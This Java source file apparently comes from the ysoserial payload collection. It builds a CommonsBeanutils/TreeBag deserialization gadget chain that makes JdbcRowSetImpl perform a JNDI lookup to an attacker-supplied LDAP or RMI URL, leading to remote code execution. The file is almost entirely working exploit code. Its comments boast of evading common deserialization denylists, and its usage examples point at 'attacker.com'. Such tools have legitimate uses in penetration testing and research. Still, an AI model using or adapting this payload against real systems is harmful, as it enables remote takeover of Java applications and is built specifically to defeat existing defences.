package ysoserial.payloads;

import javax.sql.rowset.JdbcRowSet;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.bag.TreeBag;

import com.sun.rowset.JdbcRowSetImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	JNDI-based CommonsBeanutils via TreeBag entry — the most evasive CB chain.

	Gadget chain:
		ObjectInputStream.readObject()
			TreeBag.readObject()
				AbstractMapBag.doReadObject()
					TreeMap.put()
						BeanComparator.compare()
							PropertyUtils.getProperty(jdbcRowSet, "databaseMetaData")
								JdbcRowSetImpl.getDatabaseMetaData()
									JdbcRowSetImpl.connect()
										InitialContext.lookup(dataSourceName)
											JNDI → LDAP/RMI → RCE

	Triple filter bypass:
		1. No PriorityQueue (uses TreeBag entry → bypasses PriorityQueue filter)
		2. No TemplatesImpl (uses JNDI sink → bypasses TemplatesImpl denylist)
		3. No InvokerTransformer (uses PropertyUtils → bypasses CC denylist)
		4. No --add-opens flags needed (JDK17+ compatible)

	This is the most evasive CommonsBeanutils variant: combines the TreeBag
	entry from CB3, the JNDI sink from CBJndi, and avoids all commonly
	filtered classes. Only BeanComparator + JdbcRowSetImpl are needed.

	Usage: command = JNDI URL
		e.g. "ldap://attacker.com:1389/Exploit"
		     "rmi://attacker.com:1099/Exploit"

	Requires:
		commons-beanutils 1.9.x (BeanComparator, PropertyUtils)
		commons-collections4 4.0+ (TreeBag)
		JdbcRowSetImpl (JDK built-in)
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.BOFEI_CHEN })
public class CommonsBeanutilsJndi2 extends PayloadRunner implements ObjectPayload<TreeBag> {

	public TreeBag getObject(final String jndiUrl) throws Exception {
		// JdbcRowSetImpl with attacker-controlled JNDI URL
		final JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
		jdbcRowSet.setDataSourceName(jndiUrl);
		Reflections.setFieldValue(jdbcRowSet, "iMatchColumns",
			new java.util.Vector<Integer>(java.util.Arrays.asList(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1)));
		Reflections.setFieldValue(jdbcRowSet, "strMatchColumns",
			new java.util.Vector<String>(java.util.Arrays.asList("","","","","","","","","","")));

		// BeanComparator: compare() → PropertyUtils.getProperty(obj, prop)
		// String.CASE_INSENSITIVE_ORDER avoids CC3 ComparableComparator dependency
		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

		// TreeBag entry: readObject → doReadObject → TreeMap.put → compare
		final TreeBag tree = new TreeBag(comparator);
		tree.add("1");

		// Arm comparator: property="databaseMetaData" → getDatabaseMetaData() → connect() → JNDI
		Reflections.setFieldValue(comparator, "property", "databaseMetaData");

		// Replace backing TreeMap key with JdbcRowSetImpl
		final Object backingMap = Reflections.getFieldValue(tree, "map");
		final Object root = Reflections.getFieldValue(backingMap, "root");
		if (root != null) {
			Reflections.setFieldValue(root, "key", jdbcRowSet);
		}

		return tree;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsJndi2.class, args);
	}
}
